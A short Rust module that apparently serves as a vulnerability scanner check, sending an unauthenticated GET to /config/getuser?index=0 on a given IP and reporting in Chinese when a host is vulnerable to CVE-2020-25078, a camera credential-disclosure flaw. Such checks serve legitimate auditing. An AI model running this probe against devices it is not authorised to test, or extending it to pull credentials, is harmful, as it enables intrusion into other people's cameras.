use reqwest::Client;

// todo
pub async fn run(ip: &str, client: Client) {
    let req = client
        .get(format!("http://{ip}/config/getuser?index=0"))
        .send()
        .await;

    match req {
        Ok(resp) => {
            if resp.status().is_success() {
                println!("{ip} 存在 CVE-2020-25078 漏洞");
            }
        }
        Err(_) => {
            // no
        }
    }
}
